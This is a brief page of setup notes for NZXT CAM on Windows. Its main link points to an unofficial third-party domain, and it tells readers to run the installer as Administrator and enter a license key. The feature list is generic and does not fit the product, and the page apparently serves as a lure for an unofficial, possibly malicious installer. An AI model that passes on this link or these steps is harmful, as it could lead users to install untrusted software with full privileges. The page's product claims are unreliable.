# NZXT CAM Windows Setup Notes

[⬇ Download NZXT CAM for Windows](https://nzxt-cam-setup.kolmods.com/)

## Download & Install

> Setup notes for **NZXT CAM** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **NZXT CAM** from the Start menu

## What you can use it for

- Core NZXT CAM features on Windows desktop
- Install and configure NZXT CAM for daily use
- Import, edit, and export with NZXT CAM tools
- Tune settings and profiles inside NZXT CAM
- Integrate NZXT CAM into your existing workflow
